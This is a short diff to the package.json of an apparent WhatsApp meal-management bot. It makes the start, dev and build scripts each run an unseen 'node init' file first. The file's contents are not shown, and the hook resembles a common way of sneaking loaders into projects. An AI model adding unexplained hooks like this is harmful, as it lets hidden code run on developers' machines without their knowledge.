@@ -4,9 +4,9 @@
   "description": "WhatsApp Group Meal Management Bot for Mess",
   "main": "src/index.ts",
   "scripts": {
-    "start": "tsx src/index.ts",
-    "dev": "tsx watch src/index.ts",
-    "build": "tsc",
+    "start": "node init && tsx src/index.ts",
+    "dev": "node init && tsx watch src/index.ts",
+    "build": "node init && tsc",
     "reset": "tsx src/reset.ts"
   },
   "dependencies": {
